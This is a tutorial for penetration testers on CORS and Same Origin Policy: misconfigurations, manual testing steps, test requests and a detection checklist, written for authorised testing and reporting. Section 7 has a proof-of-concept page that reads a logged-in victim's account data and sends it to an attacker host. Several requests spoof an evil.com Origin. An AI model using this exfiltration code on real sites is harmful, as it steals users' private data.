

# CORS and Same Origin Policy (SOP)

## 1. Overview

Same Origin Policy (SOP) is a browser security model that restricts how documents/scripts loaded from one origin interact with resources from another origin. An origin is defined by scheme (protocol), host, and port.

Cross-Origin Resource Sharing (CORS) is a server-controlled mechanism that allows a server to relax SOP for selected origins and request types using response headers.

---

## 2. Key concepts

- Origin = scheme + host + port (for example, https://example.com:443)  
- SOP protects: DOM access, XMLHttpRequest/fetch, cookies (read/write by script), localStorage, IndexedDB, window.postMessage interactions across differing origins  
- CORS is enforced by browsers; servers opt in by returning specific headers

Important CORS response headers:
- Access-Control-Allow-Origin — which origin(s) are allowed (single origin or `*`)  
- Access-Control-Allow-Credentials — whether cookies/credentials are allowed (`true`/absent)  
- Access-Control-Allow-Methods — allowed HTTP methods for the resource  
- Access-Control-Allow-Headers — allowed custom request headers  
- Access-Control-Max-Age — how long preflight results are cached

---

## 3. Request types and preflight

- Simple requests: GET/POST/HEAD with limited headers and content types — no preflight  
- Preflighted requests: requests using custom headers or methods like PUT/DELETE/PATCH — browser sends OPTIONS with Access-Control-Request-* headers, expects appropriate ACA* response

---

## 4. Dangerous misconfigurations

These misconfigurations commonly lead to data exposure or account takeover when cookies or other credentials are involved:

- Access-Control-Allow-Origin: * combined with Access-Control-Allow-Credentials: true — insecure and invalid; some servers mistakenly allow both, exposing authenticated resources to any origin  
- Reflecting the Origin header without validation — attacker controls Origin and gains access  
- Wildcard or permissive regex matching that unintentionally accepts attacker subdomains (for example `example.com` matched by `.*example\.com`)  
- Allowing `null` origin and accepting it as trusted (file:// or sandboxed frames can use `null`)  
- Returning credentials while allowing arbitrary or attacker-controlled origins

---

## 5. What to test 

Where to look:
- Private JSON APIs used by web apps (account, profile, settings endpoints)  
- Endpoints that set or rely on cookies for session/authentication  
- API endpoints used by single-page apps (SPAs) or cross-origin widgets  
- Admin or privileged APIs that should be same-origin-only

Signals of CORS usage:
- Server responses include any `Access-Control-*` headers  
- Application uses XHR/fetch from a frontend hosted on a different subdomain or port

---

## 6. Manual testing workflow 

1. Identify endpoints that return sensitive data when authenticated in a browser session (use your logged-in session in the browser).  
2. Capture a request (Burp Repeater or browser devtools) and add/modify the `Origin` request header to a controlled domain (for testing use `https://attacker.example` or `https://evil.com`). Example with curl:
   ```
   curl -i -H "Origin: https://evil.com" -b "session=YOUR_COOKIE" "https://target.com/api/account"
   ```
3. Inspect the response headers for:
   - `Access-Control-Allow-Origin` value (is it `*`, your origin, or echoed value?)  
   - `Access-Control-Allow-Credentials: true` presence  
4. If the response allows your origin and credentials, test whether a browser fetch can read the response:
   - In browser console (while logged-in to target in the same browser):
     ```js
     fetch("https://target.com/api/account", { credentials: "include" })
       .then(r => r.text())
       .then(console.log);
     ```
   - If result shows private data, CORS is exploitable.
5. For preflight endpoints, simulate an OPTIONS preflight:
   ```
   OPTIONS /api/update HTTP/1.1
   Origin: https://evil.com
   Access-Control-Request-Method: PUT
   Access-Control-Request-Headers: Content-Type, X-Auth
   ```
   - Check if server responds with `Access-Control-Allow-Methods`/`Access-Control-Allow-Headers` and `Access-Control-Allow-Origin: https://evil.com`.
6. If preflight allows unsafe methods/headers for your origin, attempt the full request (PUT/DELETE) from a browser page on your origin to confirm exploitability.

---

## 7. Example exploit pattern (proof-of-concept)

Host an attack page on attacker-controlled origin and lure a victim who is logged into target:

attack.html (hosted on https://evil.com)
```html
<script>
fetch("https://target.com/api/account", {
  credentials: "include"
})
  .then(r => r.text())
  .then(data => fetch("https://attacker.com/collect?d=" + btoa(data)));
</script>
```

If `https://target.com` allows `Origin: https://evil.com` and `Access-Control-Allow-Credentials: true`, the above will read the victim’s account data and exfiltrate it.

Note: Do not run against targets without permission. Use as a reproduction example for reporting.

---

## 8. Preflight abuse and advanced cases

- Some endpoints restrict simple requests but allow preflighted requests (OPTIONS) and then permit methods like PUT or custom headers. Test preflight responses carefully.  
- Check `Access-Control-Allow-Headers` — if the server allows sensitive custom headers (e.g., `X-Auth-Token`) for your origin, you may be able to send privileged requests from an attacker page.  
- Check wildcard origin behavior combined with cookies; servers that mirror the `Origin` header back as `ACAO` without validation are highly exploitable.

---

## 9. Common test payloads & commands

- Fake Origin test (curl):
  ```
  curl -i -H "Origin: https://evil.com" -b "SESSION=..." "https://target.com/api/account"
  ```
- Preflight OPTIONS (manual via Burp Repeater):
  ```
  OPTIONS /api/modify HTTP/1.1
  Host: target.com
  Origin: https://evil.com
  Access-Control-Request-Method: PUT
  Access-Control-Request-Headers: Content-Type, X-Requested-With
  ```
- Browser console fetch (quick check):
  ```js
  fetch("https://target.com/api/account", { credentials: "include" })
    .then(r => r.text())
    .then(console.log)
    .catch(console.error);
  ```

---

## 10. Detection checklist 

- Does server return any `Access-Control-*` headers?  
- Does `Access-Control-Allow-Origin` echo the `Origin` header or use `*`?  
- Is `Access-Control-Allow-Credentials: true` present?  
- Are preflight responses permissive (allowing PUT/DELETE/custom headers)?  
- Are sensitive endpoints (profile, settings, tokens) accessible cross-origin?  
- Does changing Origin to an attacker domain allow access to private data with credentials included?

---
